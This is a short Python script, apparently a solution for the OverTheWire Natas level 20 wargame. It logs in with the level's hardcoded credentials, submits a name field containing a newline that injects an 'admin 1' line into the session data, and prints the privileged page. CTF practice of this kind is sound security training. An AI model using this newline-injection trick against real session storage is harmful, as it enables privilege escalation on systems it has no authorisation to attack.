import requests

URL = "http://natas20.natas.labs.overthewire.org/index.php"
USERNAME = "natas20"
PASSWORD = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"

r = requests.Session()
r.post(URL, auth=(USERNAME, PASSWORD), data={"name": "dimas\nadmin 1"})

x = r.get(URL, auth=(USERNAME, PASSWORD))
print(x.text)
